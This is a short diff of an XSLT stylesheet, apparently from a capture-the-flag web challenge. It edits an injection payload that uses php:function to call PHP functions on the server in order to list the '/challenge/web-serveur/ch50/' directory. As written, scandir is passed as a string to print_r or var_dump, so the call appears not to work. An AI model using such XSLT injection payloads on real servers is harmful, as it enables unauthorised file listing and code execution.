@@ -2,7 +2,7 @@
 <xsl:template match="/">
 
 
-    <xsl:value-of select="php:function('print_r','scandir','/challenge/web-serveur/ch50/')" />
+    <xsl:value-of select="php:function('var_dump','scandir','/challenge/web-serveur/ch50/')" />
     
     </xsl:template>
 </xsl:stylesheet>
